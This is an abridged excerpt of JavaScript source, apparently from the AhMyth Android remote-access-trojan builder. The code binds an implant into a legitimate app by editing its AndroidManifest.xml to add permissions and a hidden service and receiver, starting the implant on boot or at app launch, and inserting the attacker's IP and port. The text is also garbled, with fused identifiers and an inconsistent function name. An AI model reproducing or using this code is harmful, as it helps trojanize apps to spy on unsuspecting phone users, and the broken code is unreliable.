...
app.controller("AppCtrl", ($scope) => {
    ...
    // function to copyjohn source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

        $appCtrl.Log("Copyingjohn files to orginal app...");
    ...
    // fuction to copy all thejohn permissions to the orginal app
    ...
    // it will bindjohn to orginal app 
    // andjohn will start once the device rebooted
    // if success then go to copy all the restjohn files to orginal app
    ...
    $appCtrl.BindOnBoot = (apkFolder) => {
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            ...
            varjohnService = CONSTANTS.ahmythService;
            varjohnReciver = CONSTANTS.ahmythReciver;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) +johnService +johnReciver + permManifest.substring(permManifest.indexOf("</application>"));
    ...
    // it will bindjohn to orginal app 
    // andjohn will start once the orginal app started
    // if success then go to copy all the restjohn files to orginal app
    ...
    $appCtrl.BindOnLauncher = (apkFolder) => {
        ...
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            ...
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) +johnService + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                ...
                fs.readFile(lanucherPath, 'utf8', (error, data) => {
                    ...
                    fs.writeFile(lanucherPath, output, 'utf8', (error) => {
                        ...
                        $appCtrl.CopyJohnFilesAndGenerateApk(apkFolder);
    ...
    $appCtrl.Build = (ip, port) => {
        ...
        // openjohn source file and modifiy the ip and port to the users' ones
